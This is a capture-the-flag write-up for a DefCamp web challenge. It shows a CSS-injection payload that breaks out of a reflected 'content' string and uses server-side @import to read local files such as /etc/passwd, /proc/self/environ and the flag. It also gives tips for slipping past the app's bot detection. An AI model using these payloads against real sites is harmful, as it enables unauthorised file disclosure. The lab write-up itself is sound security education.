# DEFCAMP CTF – Web Challenge: `aiscrimination`

- **Author:** 0xAMA
- **Flag format:** `CTF{sha256}`
- **Challenge description:** *"I want to be included."*
- **Question:** *"What is the flag hidden by the inclusion design system?"*
- **Final flag**

```
CTF{5bb9cb8b8ff43e243fe85fceaf646e7ba6a5c80250e96678be2aa71add38eb97}
```

---

## 1. Target

The challenge instance changes address between runs (the author redeploys it).

- Initial instance: `http://34.159.240.152:32560`
- Working instance used for the solve: `http://136.92.7.211:31936`

> **Operational note:** The application actively rate-limits / bot-detects.
> Small, repetitive, mechanical requests get answered with an HTTP `429` page that
> masquerades as an "AI detected" page. Long, browser-shaped requests (real
> `User-Agent`, `Accept`, `Accept-Language`, referrer/origin, a cookie jar) with
> healthy delays between them are accepted. All requests below were sent one at a
> time with `>= 20-30s` spacing and browser-like headers.

---

## 2. Recon

`GET /` returns a Flask / gunicorn application (`Server: gunicorn`, `Vary: Cookie`).

Key elements of the homepage:

```html
<form method="post" action="/join">
  <input name="display_name" maxlength="80"  ... required>
  <textarea name="comment" maxlength="800" ... required></textarea>
  <input name="statement" maxlength="800" ... required>
  <button type="submit">Request inclusion →</button>
</form>
```

Navigation reveals:

- `/` – the feed
- `/policy` – "Human policy"
- `/#join` – "Be included" (the submission form)

Community posts ("inclusion cards") are rendered like this:

```html
<article id="card-<32-hex-uuid>" class="post community-post">
  ...
  <a href="/people/<uuid>">Open this inclusion card →</a>
  <span class="imported-fragment"></span>
</article>
<link rel="stylesheet" href="/assets/cards/<uuid>/identity.css">
```

Static assets referenced:

- `/static/style.css`
- `/static/feed.css`
- `/static/images/ai-detected-michael-scott.webp` (shown on the 429 "AI detected" page)

### 2.1 The "AI detected" 429 page

Abusing the endpoint with rapid, minimal requests returns:

```
HTTP/1.1 429
title: AI detected · AIscrimination
```

```html
<h1>You cannot AI your way through this one.</h1>
<p>You seriously brought AI to a challenge called AIscrimination? ...</p>
```

This is **not** the real policy page — it is the rate-limit / bot-detection wall.
The genuine `/policy` page explains the traffic rule in-flavor:

> *"Visitors sending tiny, repetitive, or conspicuously mechanical requests may be
> asked to take five minutes and reflect on the intangible beauty of waiting.
> Long, browser-shaped requests are regarded as deeply human."*

So the defense was purely a **traffic-shape / rate-limit** gate, not a magic AI
classifier.

### 2.2 Flavor-text breadcrumbs

`GET /posts/reused-component` ("The Brand Team Reused a Component") contains the
important hints:

> *"Good news: inclusion cards no longer copy style fragments by hand. Bad news:
> someone described the path rules as 'intuitive.'"*

Community comments under that post:

- **Route 404:** *"Paths and URLs are the two things I never understood. Luckily,
  the internet treats every wrong turn like a feature."*
- **Tired SRE:** **"If the renderer can find it, the renderer will include it.
  I hate that sentence."**
- **Bogdan Carp:** *"When the lights go out, I can still hear the chatbot typing
  'I understand.' Brev."*

These point at **path-based server-side inclusion** in the "design system".

---

## 3. Understanding the "inclusion design system"

Submitting the `/join` form:

```
POST /join
display_name=quizno
comment=the printer at work keeps asking for an operator name and im not even paper
statement=i belong here??
```

produces:

```
HTTP/1.1 302 Found
Location: /
Set-Cookie: session=...; HttpOnly; Path=/
```

The signed Flask session cookie decodes to:

```json
{"profile_id": "db72dfe3d81c43dfa13a0e2bfabecd97"}
```

The card is published at:

- `GET /people/<profile_id>` (human-readable card)
- `GET /assets/cards/<profile_id>/identity.css` (compiled card stylesheet)

Fetching `identity.css`:

```css
/* AIscrimination identity-card stylesheet */
.identity-card::after {
  content: "i belong here??";
  display: block;
  color: #d9d4ff;
  font-size: .93rem;
  ...
}
```

**The `statement` field is reflected server-side inside a CSS `content: "..."` string.**
This is the core of the "inclusion design system": the profile page note states

> *"Your card has been published. It was compiled from locally imported design
> fragments."*

The design system *compiles* a card stylesheet out of imported fragments, and one
of the fragments is user-controlled (`statement`).

---

## 4. Vulnerability: CSS string escape → `@import` → LFI

Every `identity.css` starts with:

```css
.identity-card::after {
  content: "<statement>";
  display: block;
  ...
}
```

Because `<statement>` is reflected **without escaping**, we can close the string
and the declaration block, and then inject arbitrary CSS:

```
"; } @import url('/etc/passwd'); .q::before{content:'MKC
```

Rendered CSS:

```css
.identity-card::after {
  content: ""; }
@import url('/etc/passwd');
.q::before{content:'MKC';
  display: block;
  ...
}
```

Fetching the resulting `identity.css` revealed that the server **actually resolves
`@import` server-side and inlines the imported file into the stylesheet** — i.e.
the renderer *"will include it"*. It read `/etc/passwd` and dumped it inside a
generated rule:

```css
#card-<uuid> .imported-fragment::after {
  content: "root:x:0:0:root:/root:/bin/bash\A daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\A ... ctf:x:1000:1000::/home/ctf:/bin/sh\A ";
  display: inline-block;
  ...
}
```

Notes:

- Newlines in imported content are escaped as `\A` inside the CSS string.
- Non-existent files produce the placeholder comment `/* design fragment unavailable */`.
- `file://...` URLs are not supported (also "unavailable"), but plain absolute
  filesystem paths work → **arbitrary local file read**.

---

## 5. Locating the flag

A single crafted `statement` can batch many imports:

```
"; } @import url('/flag'); @import url('/flag.txt'); @import url('/app/flag.txt');
@import url('/app/flag'); @import url('/home/ctf/flag.txt'); @import url('/home/ctf/flag');
@import url('/etc/flag.txt'); @import url('/root/flag.txt'); @import url('/proc/self/environ');
@import url('/app/app.py'); @import url('/app/main.py'); @import url('/proc/self/cmdline');
.q::before{content:'MKC
```

Because the generated rules appear **in import order**, missing vs. found is easy
to map:

1. `/flag` → unavailable
2. `/flag.txt` → unavailable
3. `/app/flag.txt` → unavailable
4. `/app/flag` → unavailable
5. **`/home/ctf/flag.txt` → SUCCESS**

```css
#card-<uuid> .imported-fragment::after {
  content: "CTF{5bb9cb8b8ff43e243fe85fceaf646e7ba6a5c80250e96678be2aa71add38eb97}\A ";
}
```

6. `/home/ctf/flag` → unavailable
7. `/etc/flag.txt` → unavailable
8. `/root/flag.txt` → unavailable
9. `/proc/self/environ` → SUCCESS
10. `/app/app.py` → unavailable
11. `/app/main.py` → unavailable
12. `/proc/self/cmdline` → SUCCESS

### Environment & process leaks (bonus recon)

`/proc/self/environ`:

```
DATABASE_PATH=/tmp/aiscrimination.db
THEME_ROOT=/home/ctf/app/themes/generated
PWD=/home/ctf/app
HOME=/home/ctf
PORT=5000
...
```

`/proc/self/cmdline`:

```
/usr/local/bin/python3.12 /usr/local/bin/gunicorn --bind 0.0.0.0:5000 --workers 2 --threads 4 --timeout 60 app:app
```

This confirmed the app layout (`/home/ctf/app`, gunicorn `app:app`) and pointed to
`/home/ctf/flag.txt` as the flag file.

---

## 6. Validation

A second, minimal card that imports only `/home/ctf/flag.txt` was created and its
`identity.css` fetched, confirming the exact same value:

```css
content: "CTF{5bb9cb8b8ff43e243fe85fceaf646e7ba6a5c80250e96678be2aa71add38eb97}\A ";
```

The value matches the flag format `CTF{sha256}` (64 lowercase hex characters).

---

## 7. Root cause / lesson

The inclusion card's `identity.css` is compiled by a renderer that:

1. reflects the user-controlled `statement` into a CSS `content` string without
   escaping (CSS injection), and
2. **follows `@import` server-side**, inlining the target file's contents into the
   generated stylesheet.

Combined, these allow **arbitrary file read** (LFI) through a CSS design-system
feature: the "renderer will include it" *if it can find it*.

Fix ideas:

- Escape/harden user content before it is embedded in any CSS (e.g. escape
  `"`, `}`, and control characters, or move it out of the stylesheet entirely).
- Never resolve `@import`/`url()` against the local filesystem; whitelist trusted
  fragment paths, or inline fragments at build time with strict allow-lists.

---

## 8. Request log (payoff summary)

| Method | Path | Result |
|---|---|---|
| GET | `/` | 200 – feed + `/join` form |
| GET | `/policy` | 200 – genuine traffic policy |
| POST | `/join` | 302 – session cookie carries `profile_id` |
| GET | `/people/<uuid>` | 200 – identity card page |
| GET | `/assets/cards/<uuid>/identity.css` | 200 – compiled fragment, CSS injection surface |
| POST | `/join` (`statement` = CSS escape + `@import '/etc/passwd'`) | 302 |
| GET | `/assets/cards/<uuid>/identity.css` | 200 – passwd inlined → LFI confirmed |
| POST | `/join` (batch imports incl. `/home/ctf/flag.txt`) | 302 |
| GET | `/assets/cards/<uuid>/identity.css` | 200 – flag inlined |
| POST+GET | single `/home/ctf/flag.txt` import | 200 – flag confirmed |